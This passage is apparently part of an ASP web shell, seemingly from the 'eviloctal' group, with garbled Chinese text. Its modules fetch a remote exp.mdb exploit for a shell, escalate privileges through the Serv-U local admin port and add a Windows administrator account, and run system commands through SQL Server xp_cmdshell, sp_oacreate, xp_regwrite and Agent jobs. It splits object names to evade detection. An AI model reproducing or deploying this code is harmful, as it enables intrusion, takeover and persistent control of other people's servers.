		Set rs = CreateObject("ADODB.RecordSet")
		Set stream = CreateObject("ADODB.Stream")
		Set conn = CreateObject("ADO"&T&"DB.Conne"&T&"ction")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"

		conn.Open connStr
		rs.Open "FileData", conn, 1, 1
		stream.Open
		stream.Type = 1

		Do Until rs.Eof
			theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
			If fsoX.FolderExists(str & theFolder) = False Then
				createFolder(str & theFolder)
			End If
			stream.SetEos()
			stream.Write rs("fileContent")
			stream.SaveToFile str & rs("thePath"), 2
			rs.MoveNext
		Loop

		rs.Close
		conn.Close
		stream.Close
		Set ws = Nothing
		Set rs = Nothing
		Set stream = Nothing
		Set conn = Nothing
	End Sub

	Sub createFolder(thePath)
		Dim i
		i = Instr(thePath, "\")
		Do While i > 0
			If fsoX.FolderExists(Left(thePath, i)) = False Then
				fsoX.CreateFolder(Left(thePath, i - 1))
			End If
			If InStr(Mid(thePath, i + 1), "\") Then
				i = i + Instr(Mid(thePath, i + 1), "\")
			 Else
				i = 0
			End If
		Loop
	End Sub

	Sub saTreeForMdb(thePath, rs, stream)
		Dim item, theFolder, sysFileList
		sysFileList = "$eviloctalTop.mdb$eviloctalTop.ldb$"
		Set theFolder = saX.NameSpace(thePath)
		
		For Each item In theFolder.Items
			If item.IsFolder = True Then
				saTreeForMdb item.Path, rs, stream
			 Else
				If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
					rs.AddNew
					rs("thePath") = Mid(item.Path, 4)
					stream.LoadFromFile(item.Path)
					rs("fileContent") = stream.Read()
					rs.Update
				End If
			End If
		Next

		Set theFolder = Nothing
	End Sub

%>

<%if request("ado")="newado" then%>
<% 
if Session(m & "userPassword")<>userPassword then
response.write "û�е�½"
%>
<%else%>

<style>
body{font-family: ����;   font-size: 10pt}
table{ font-family: ����; font-size: 9pt }
a{ font-family: ����; font-size: 9pt; color: #000000; text-decoration: none }
a:hover{ font-family: ����; color: #ff0000; text-decoration: none }
input {	BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
</style>
<script type="text/JavaScript">
<!--

function MM_goToURL() { //v3.0
  var i, args=MM_goToURL.arguments; document.MM_returnValue = false;
  for (i=0; i<(args.length-1); i+=2) eval(args[i]+".location='"+args[i+1]+"'");
}
//-->
</script>
<form name="f1" action="">
<table width="331" border="0" align="center">
    <td colspan="2"><input type="hidden" name="ado" value="newado">
 <label>
����EXP
   <input type="radio" name="mact" value="downexp" checked/>
 </label>
        <label>
��������EXP
        <input type="radio" name="mact" value="runexp" onclick="javascript:alert('ִ�к󽫵õ�22�˿ڵ�SHELL');MM_goToURL('parent','?ado=newado&mact=runexp');return document.MM_returnValue"/>
      </label></td>
    </tr>
  <tr>
    <td width="154"><input name="urlexp" type="text" value="http://www.xxx.com/exp.mdb" size="25"></td>
    <td width="167">

        <input type="submit" value="�ύ"></td>
  </tr>
</table>
</form>





<%
if request("mact")="downexp" then 
if request("urlexp")<>"" then
if instr(lcase(request("urlexp")),"exp.mdb")=0 then
response.write "<script>alert('���ص��ļ�������Ϊexp.mdb');history.back();</script>"
end if
if left(lcase(trim(request("urlexp"))),7)<>"http://" then
response.write "<script>alert('������url����ȷ��ʽhttp://');history.back();</script>"
end if
GetRemoteFiels1 request("urlexp"),server.mappath("."),"exp"
response.write "<script>alert('���سɹ�')</script>"
else
response.write "<script>alert('���������ص�ַ');history.back();</script>"
end if
end if
if request("mact")="runexp" then
	dim conn
	dim connstr
	dim db
	db="exp.mdb"
	set conn=server.createobject("ADODB.Connection")
	connstr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Server.MapPath(""&db&"")
	conn.open connstr
	'conn.close
	'set conn=nothing
end if
end if
%>

<%
Function GetRemoteFiels1(RemotePath, LocalPath, FileName)
Dim strBody
Dim FilePath

    On Error Resume Next

    'ȡ����
strBody = GetBody1(RemotePath)
'ȡ�ñ�����ļ���
if Right(LocalPath, 1) <> "\" then LocalPath = LocalPath & "\"
FilePath = LocalPath & GetFileName1(RemotePath, FileName)
'�����ļ�
if SaveToFile1(strBody, FilePath) = true and err.Number = 0 then
     GetRemoteFiles = true
else
     GetRemoteFiles = false
end if

End Function

'Զ�̻�ȡ����
Function GetBody1(url) 
Dim Retrieval
    '����XMLHTTP����
    Set Retrieval = CreateObject("Microsoft.XMLHTTP") 
    With Retrieval 
        .Open "Get", url, False, "", "" 
        .Send 
        GetBody = .ResponseBody
    End With 
    Set Retrieval = Nothing 
End Function

'�����ļ���
Function GetFileName1(RemotePath, FileName1)
Dim arrTmp
Dim strFileExt
    arrTmp = Split(RemotePath, ".")
strFileExt = arrTmp(UBound(arrTmp))
    GetFileName = FileName1 & "." & strFileExt
End Function

'�������ݱ���Ϊ�ļ�
Function SaveToFile1(Stream1, FilePath1)
Dim objStream

    On Error Resume Next

    '����ADODB.Stream���󣬱���ҪADO 2.5���ϰ汾
    Set objStream = Server.CreateObject("ADODB.Stream")
    objStream.Type = 1  '�Զ�����ģʽ��
    objStream.Open
    objstream.write Stream1
    objstream.SaveToFile FilePath1, 2
    objstream.Close()
    '�رն����ͷ���Դ
    Set objstream = Nothing

if err.Number <> 0 then
     SaveToFile = false
else
     SaveToFile = true
end if
End Function
%>
<% end if %>

<%if request("su")="su" then%>
<% 
if Session(m & "userPassword")<>userPassword then
response.write "û�е�½"
%>
<%else%>
<% 
Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit
dim action
action=request("action")
if  not isnumeric(action) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
   f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=eviloctal|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsereviloctaloginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case action
case 1
    set a=Server.CreateObject("Micro"&ttfct&"soft.XMLHTTP")
    a.open "GET", "http://127.0.0.1:" & port & "/eviloctal/upadmin/s1",True, "", ""
    a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
    set session("a")=a
%>
<form method="post" name="eviloctal">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="2"></form>
<script language="javascript">
document.write('<center>�������� 127.0.0.1:<%=port%>,ʹ���û���: <%=user%>,���<%=pass%>...<center>');
setTimeout("document.all.eviloctal.submit();",4000);
</script>
<%
case 2
    set b=Server.CreateObject("Micro"&ttfct&"soft.XMLHTTP")
    b.open "GET", "http://127.0.0.1:" & ftpport & "/eviloctal/upadmin/s2", True, "", ""
    b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
   set session("b")=b
%>
<form method="post" name="eviloctal">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="3"></form>
<script language="javascript">
document.write('<center>��������Ȩ��,��ȴ�...,<center>');
setTimeout("document.all.eviloctal.submit();",4000);
</script>
<%
case 3
    set c=Server.CreateObject("Micro"&ttfct&"soft.XMLHTTP")
    c.open "GET", "http://127.0.0.1:" & port & "/eviloctal/upadmin/s3", True, "", ""
    c.send loginuser & loginpass & mt & deldomain & quit
    set session("c")=c
%>
<center>��Ȩ���,��ִ�������<br><font color=red><%=cmd%></font><br><br>
</center>

<%
case else
on error resume next
    set a=session("a")
    set b=session("b")
    set c=session("c")
    a.abort
    Set a = Nothing
    b.abort
    Set b = Nothing
    c.abort
    Set c = Nothing
%>
<center><form method="post" name="eviloctal">
<table width="494" height="163" border="1" cellpadding="0" cellspacing="1" bordercolor="#666666">
  <tr align="center" valign="middle">
    <td colspan="2">Serv-U ����Ȩ�� ASP��</td>
  </tr>
  <tr align="center" valign="middle">
    <td width="100">�û���:</td>
    <td width="379"><input name="u" type="text" id="u" value="LocalAdministrator"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>�ڡ��</td>
    <td><input name="p" type="text" id="p" value="#l@$ak#.lk;0@P"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>�ˡ��ڣ�</td>
    <td><input name="port" type="text" id="port" value="43958"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>ϵͳ·����</td>
    <td><input name="f" type="text" id="f" value="<%=f%>" size="8"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>�����</td>
    <td><input name="c" type="text" id="c" value="cmd /c net user ttfct ttfct /add & net localgroup administrators ttfct /add" size="50"></td>
  </tr>
 
  <tr align="center" valign="middle">
    <td colspan="2"><input type="submit" name="Submit" value="�ύ">��
      <input type="reset" name="Submit2" value="����">
      <input name="action" type="hidden" id="action" value="1"></td>
  </tr>
</table></form></center>
<% end select
function Gpath()
on error resume next
    err.clear
    set f=Server.CreateObject("Scrip"&sdt&"ting.FileSy"&sds&"stemObject")
    if err.number>0 then
	gpath="c:"
        exit function
    end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
Function GName() 
If request.servervariables("SERVER_PORT")="80" Then 
GName="http://" & request.servervariables("server_name")&lcase(request.servervariables("script_name")) 
Else 
GName="http://" & request.servervariables("server_name")&":"&request.servervariables("SERVER_PORT")&lcase(request.servervariables("script_name")) 
End If 
End Function 
%>
<% end if %>
<% end if %>

<%if request("sql")="yes" then%>
<%
if Session(m & "userPassword")<>userPassword then
response.write "û�е�½"
%>
<%else%>
<%on error resume next%>
<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"> 
<title>SqlRootkit </title>
<style>
body{font-family: ����;   font-size: 10pt}
table{ font-family: ����; font-size: 9pt }
a{ font-family: ����; font-size: 9pt; color: #000000; text-decoration: none }
a:hover{ font-family: ����; color: #ff0000; text-decoration: none }
input {	BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
</style>
</head> 
<%
if session("login")="" then
                           response.write "<center><font color=red>û�е�½</font></center><br>"
			   else response.write "<center><font color=red>�Ѿ���½</font></center><br>"
end if
                           response.write "<center><a href="&Request.ServerVariables("URL")&"?sql=yes&action=logout><font color=black>�˳���½</font></a></center><br>"
%>
<%
If request("action")="login" then
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & request.Form("server") & "," & request.Form("port") & ";Password=" & request.Form("pass") & ";UID=" & request.Form("name")
                       if err.number=-2147467259 then 
                       response.write "<script>alert('����Դ���Ӵ���');history.back();</script>"
                       response.end
                       elseif err.number=-2147217843 then
                       response.write "<script>alert('�û�������������');history.back();</script>"
                       response.end
                       elseif err.number=0 then
                       strQuery="select @@version"
		       set recResult = adoConn.Execute(strQuery)
		       If instr(recResult(0),"NT 5.0") then
		       response.write "<font color=red>Windows 2000ϵͳ</font><br>"
                       session("system")="2000"
                       elseif instr(recResult(0),"NT 5.1")  then
                       response.write "<font color=red>Windows XPϵͳ</font><br>"
                       session("system")="xp"
                       elseif instr(recResult(0),"NT 5.2")  then
                       response.write "<font color=red>Windows 2003ϵͳ</font><br>"
                       session("system")="2003"
                       else
                       response.write "<font color=red>����ϵͳ</font><br>"
                       session("system")="no"
                       end if
                       strQuery="SELECT IS_SRVROLEMEMBER('sysadmin')"
		       set recResult = adoConn.Execute(strQuery)
                       if recResult(0)=1 then
                       response.write "<font color=red>��ϲ��Sql Server���Ȩ��</font><br>"
                       session("pri")=1
                       else
                       response.write "<font color=red>���ƣ�Ȩ�޲������Ʋ���ִ�����</font><br>"
                       session("pri")=0
                       end if              
		       session("login")="yes"
		       session("name")=request.Form("name")
		       session("pass")=request.Form("pass")
		       session("server")=request.Form("server")
		       session("port")=request.Form("port")
                       end if

elseif request("action")="test"  then
                       if session("login")<>"" then
                       if session("system")="2000" then
                       response.write "<font color=red>Windows 2000ϵͳ</font><br>"
                       elseif session("system")="xp" then
                       response.write "<font color=red>Windows XPϵͳ</font><br>"
                       elseif session("system")="2003" then
                       response.write "<font color=red>Windows 2003ϵͳ</font><br>"
                       else
                       response.write "<font color=red>��������ϵͳ</font><br>"
                       end if
                       if session("pri")=1 then
                       response.write "<font color=red>��ϲ��Sql Server���Ȩ��</font><br>"
                       else 
                       response.write "<font color=red>���ƣ�Ȩ�޲������Ʋ���ִ�����</font><br>"
                       end if
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")        

                       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_cmdshell'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then
		       session("XP_cmdshell")=1 
		       response.write "<font color=red>XP_cmdshell............. ����!</font>"
                       else
		       session("XP_cmdshell")=0 
		       response.write "<font color=red>XP_cmdshell............. ������!</font>"
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='sp_oacreate'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>sp_oacreate............. ����!</font>"
		       session("sp_oacreate")=1
                       else 
		       response.write "<br><font color=red>sp_oacreate............. ������!</font>"
                       session("sp_oacreate")=0
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_regwrite'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>xp_regwrite............. ����!</font>"
		       session("xp_regwrite")=1
                       else 
		       response.write "<br><font color=red>xp_regwrite............. ������!</font>"
		       session("xp_regwrite")=0
                       End if
		       strQuery="select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_servicecontrol'"
		       set recResult = adoConn.Execute(strQuery) 
		       If recResult(0) Then 
		       response.write "<br><font color=red>xp_servicecontrol ����!</font>"
		       session("xp_servicecontrol")=1
                       else 
		       response.write "<br><font color=red>xp_servicecontrol ������!</font>"
		       session("xp_servicecontrol")=0
                       End if
                       else 
                       response.write "<script>alert('������ʱ�����µ�½��')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?sql=yes&action=logout><font color=black>��½��ʱ</font>"
                       response.end
                       end if 

elseif request("action")="cmd" then
                       if session("login")<>"" then
                       if session("pri")=1 then
		       If request("tool")="XP_cmdshell" then
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
		       If request.form("cmd")<>"" Then 
  		       strQuery = "exec master.dbo.xp_cmdshell '" & request.form("cmd") & "'" 
                       set recResult = adoConn.Execute(strQuery) 
                       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop
		       End if
		       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "����"&request("tool")&"��չִ��"
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       end if 
		       		       
                       elseif request("tool")="sp_oacreate" then 
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
		       If request.form("cmd")<>"" Then 
  		       strQuery = "CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);use master declare @o int exec sp_oacreate 'WScri"&T&"pt.She"&T&"ll',@o out exec sp_oamethod @o,'run',NULL,'cmd /c "&request("cmd")&" > 8617.tmp',0,true;BULK INSERT [jnc] FROM '8617.tmp' WITH (KEEPNULLS);"
		       adoConn.Execute(strQuery)
                       strQuery = "select * from jnc"
		       set recResult = adoConn.Execute(strQuery)
		       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop 
                       End if
		       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
		       Response.Write "����"&request("tool")&"��չִ��"	
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       strQuery = "DROP TABLE [jnc];declare @o int exec sp_oacreate 'WScri"&T&"pt.She"&T&"ll',@o out exec sp_oamethod @o,'run',NULL,'cmd /c del 8617.tmp'"
 		       adoConn.Execute(strQuery)
		       End if

                       elseif request("tool")="xp_regwrite" then
                       if session("system")="2000" then
                       path="c:\winnt\system32\ias\ias.mdb"
                       else
                       path="c:\windows\system32\ias\ias.mdb"
                       end if
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
		       If request.form("cmd")<>"" Then
		       cmd=chr(34)&"cmd.exe /c "&request.form("cmd")&" > 8617.tmp"&chr(34)
		       strQuery = "CREATE TABLE [jnc](ResultTxt nvarchar(1024) NULL);exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&cmd&")');"
                       adoConn.Execute(strQuery)
		       strQuery = "select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c copy 8617.tmp jnc.tmp"&chr(34)&")');BULK INSERT [jnc] FROM 'jnc.tmp' WITH (KEEPNULLS);"
		       set recResult = adoConn.Execute(strQuery)
		       strQuery="select * from [jnc];"
                       set recResult = adoConn.Execute(strQuery)
		       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop 
                       End if
                       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "����"&request("tool")&"��չִ��"
                       Response.Write request.form("cmd") 
                       Response.Write strResult
                       Response.Write "</textarea>"
		       strQuery = "DROP TABLE [jnc];exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c del 8617.tmp&&del jnc.tmp"&chr(34)&")');"
		       adoConn.Execute(strQuery)
		       End if

		       elseif request("tool")="sqlserveragent" then
		       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")

		       If request.form("cmd")<>"" Then
                       if session("sqlserveragent")=0 then
                       strQuery = "exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT';"
                       adoConn.Execute(strQuery)
                       session("sqlserveragent")=1
                       end if

		       strQuery = "use msdb CREATE TABLE [jncsql](ResultTxt nvarchar(1024) NULL) exec sp_delete_job null,'x' exec sp_add_job 'x' exec sp_add_jobstep Null,'x',Null,'1','CMDEXEC','cmd /c "&request.form("cmd")&"' exec sp_add_jobserver Null,'x',@@servername exec sp_start_job 'x';"
                       adoConn.Execute(strQuery)
                       adoConn.Execute(strQuery)
                       adoConn.Execute(strQuery)
                    
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "����"&request("tool")&"��չִ��"
                       Response.Write request.form("cmd") 
                       Response.Write vbcrf
                       Response.Write "����չ�޻��ԣ�����ͨ���ض���鿴������"
                       Response.Write "</textarea>"
		       strQuery = "use msdb drop table [jncsql];"
                       adoConn.Execute(strQuery)
                       End if
                       elseif request("tool")="" then 
                       response.write "<script>alert('ѡ����Ҫʹ�õ���չ')</script>"
                       end if
                       else
                       response.write "<script>alert('Ȩ�޲���Ŷ��')</script>"
                       end if
                       else 
                       response.write "<script>alert('������ʱ�����µ�½��')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>��½��ʱ</font>"
                       response.end
                       end if

elseif request("action")="resume" then
                       if session("login")<>"" then
                       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
                       if session("xp_cmdshell")=0 then
                       strQuery="dbcc addextendedproc ('xp_cmdshell','xplog70.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>�Ѿ����Իָ�xp_cmdshell</font>"
                       elseif session("sp_OACreate")=0 then
		       strQuery="dbcc addextendedproc ('sp_OACreate','odsole70.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>�Ѿ����Իָ�sp_OACreate</font>"
		       elseif session("xp_regwrite")=0 then
		       strQuery="dbcc addextendedproc ('xp_regwrite','xpstar.dll')"
		       adoConn.Execute(strQuery)	
                       response.write "<font color=red>�Ѿ����Իָ�xp_regwrite</font>"	
		       else response.write "<font color=red>��ϲ�������ȫ</font>"	
                       end if
                       else 
                       response.write "<script>alert('������ʱ�����µ�½��')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>��½��ʱ</font>"
                       response.end
                       end if 	
                                
elseif request("action")="sql" then
                       if session("login")<>"" then
		       If request.form("sql")<>"" then
                       set adoConn=Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction") 
 		       adoConn.Open "Provider=SQLOLEDB.1;DATA SOURCE=" & session("server") & "," & session("port") & ";Password=" & session("pass") & ";UID=" & session("name")
                       strQuery=request.form("sql")
                       set recResult = adoConn.Execute(strQuery) 
                       If NOT recResult.EOF Then 
                       Do While NOT recResult.EOF 
                       strResult = strResult & chr(13) & recResult(0) 
                       recResult.MoveNext 
                       Loop
		       End if
		       set recResult = Nothing
                       Response.Write "<textarea rows=10 cols=50>"
                       Response.Write "ִ��SQL���:"
                       Response.Write request.form("sql") 
                       Response.Write strResult
                       Response.Write "</textarea>"
                       end if
                       else 
                       response.write "<script>alert('������ʱ�����µ�½��')</script>"
                       response.write "<center><a href="&Request.ServerVariables("URL")&"?action=logout><font color=black>��½��ʱ</font>"
                       response.end
                       end if

elseif request("action")="logout" then
                       set adoConn=nothing
                       session("login")=""
                       session("name")=""
                       session("pass")=""
                       session("server")=""
                       session("port")=""
                       session("system")=""
                       session("pri")=""		              
end if
%>
<%
if session("login")="" then
                           response.write "<center>"
			   response.write "<form name=form method=POST action=?sql=yes&actoin=login>"
			   response.write "<p>SQL�û�����"
			   response.write "<input name=name type=text id=name value="&session("name")&">"
 		           response.write "  SQL���룺"
			   response.write "<input name=pass type=password id=pass value="&session("pass")&">"
			   response.write "<p>SQL��������"
			   response.write "<input name=port type=text id=server value=127.0.0.1>"
 		           response.write "  SQL�˿ڣ�"
			   response.write "<input name=port type=text id=port value=1433>"
                           response.write "<p>"
			   response.write "  <input name=action type=submit value=login>"
			   response.write "</form>"
                           response.write "</center>"

else       
                           response.write "<center>"
                           response.write "<form name=form method=POST action=?sql=yes&actoin=test>"
			   response.write "<p>�����⣺"
			   response.write "  <input name=action type=hidden value=test>"
			   response.write "  <input type=submit value=������>"
			   response.write "</form>"
            
                           response.write "<form name=form method=POST action=?sql=yes&actoin=resume>"
			   response.write "<p>����ָ���"
			   response.write "  <input name=action type=hidden value=resume>"
			   response.write "  <input type=submit value=�ָ����>"
			   response.write "</form>"
  
		           response.write "<form name=form method=POST action=?sql=yes&actoin=cmd>"
			   response.write "<p>ϵͳ���"
			   response.write "  <input name=cmd type=text>"
			   response.write "<select name='tool' ><option value=''>----��ѡ�����г�������----</option><option value=XP_cmdshell>XP_cmdshell</option><option value=sp_oacreate>sp_oacreate</option><option value=xp_regwrite>xp_regwrite</option><option value=sqlserveragent>sqlserveragent</option></option></select>"
			   response.write "  <input name=action type=hidden value=cmd>"
			   response.write "  <input type=submit value=ִ��>"
			   response.write "</form>"
		           response.write "<form name=form1 method=POST action=?sql=yes&actoin=sql>"
			   response.write "<p>ִ����䣺"
			   response.write "   <input name=sql type=text>"
			   response.write "  <input name=action type=hidden value=sql>"
			   response.write "  <input type=submit value=ִ��>"			   
			   response.write "</form>"
                           response.write "</center>"


                           
end if
%>
<br>
<br>
<br>
<br="fname.value=file1.value"> 
</td></tr> 
</table> 
</form> 
</body> 
</html>

<%end if%>
<% end if %>

<%if request("kill")="yes" then%>
<% 
if Session(m & "userPassword")<>userPassword then
response.write "û�е�½"
%>
<%else%>
<%
	if request.QueryString("act")<>"scan" then
%>
				<form action="?kill=yes&act=scan" method="post">
				<b>INPUT THE PATH��</b>
				<input name="path" type="text" style="border:1px solid #999" value="." size="30" />
				<br>
				<br>
				<br>
				<input type="submit" value=" SCAN NOW " style="background:#fff;border:1px solid #999;padding:2px 2px 0px 2px;margin:4px;border-width:1px 3px 1px 3px" />
				</form>
<%
else

Server.ScriptTimeout = 600
DimFileExt = "asp,cer,asa,cdx"
Dim Report, Sun, SumFiles, SumFolders

	Sun = 0
	SumFiles = 0
	SumFolders = 1
	requestPath = request.Form("path")
	if requestPath = "" or InStr(requestPath,"..\") then
		response.Write("No Hack")
		response.End()
	end if
	timer1 = timer
	if requestPath = "\" then
		TmpPath = Server.MapPath("\")
	elseif requestPath = "." then
		TmpPath = Server.MapPath(".")
	else
		TmpPath = Server.MapPath("\") & "\" & requestPath
	end if
	Call ShowAllFile(TmpPath)
%>
<table width="100%" border="0" cellpadding="0" cellspacing="0" class="CContent">
  <tr>
    <th>EVAL THINGS
  </tr>
  <tr>
    <td class="CPanel" style="padding:5px;line-height:170%;clear:both;font-size:12px">
        <div id="updateInfo" style="background:ffffe1;border:1px solid #89441f;padding:4px;display:none"></div>
SCANED FILES <font color="#FF0000"><%=SumFolders%></font>��FILES <font color="#FF0000"><%=SumFiles%></font>��SPECIAL FILES &nbsp;<font color="#FF0000"><%=Sun%></font>
	<table width="100%" border="0" cellpadding="0" cellspacing="0">
	 <tr>
		 <td valign="top">
			 <table width="100%" border="1" cellpadding="0" cellspacing="0" style="padding:5px;line-height:170%;clear:both;font-size:12px">
			 <tr>
			   <td width="20%">PATH</td>
			   <td width="20%">CODES</td>
			   <td width="40%">DESCRIPTION</td>
			   <td width="20%">CREATE/MIDIFY TIME</td>
			   </tr>
		     <p>
			 <%=Report%>
			 <br/></p>
			 </table></td>
	 </tr>
	</table>
</td></tr></table>
<%
timer2 = timer
thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
response.write "<br><font size=""2"">COSTED"&thetime&" MI-SECONDS</font>"
	end if
end if
end if

%>
</body>
</html>
<%
Function CheckExt(FileExt)
	If DimFileExt = "*" Then CheckExt = True
	Ext = Split(DimFileExt,",")
	For i = 0 To Ubound(Ext)
		If Lcase(FileExt) = Ext(i) Then 
			CheckExt = True
			Exit Function
		End If
	Next
End Function

Function GetDateModify(filepath)
	Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFile(filepath) 
	s = f.DateLastModified 
	set f = nothing
	set fso = nothing
	GetDateModify = s
End Function

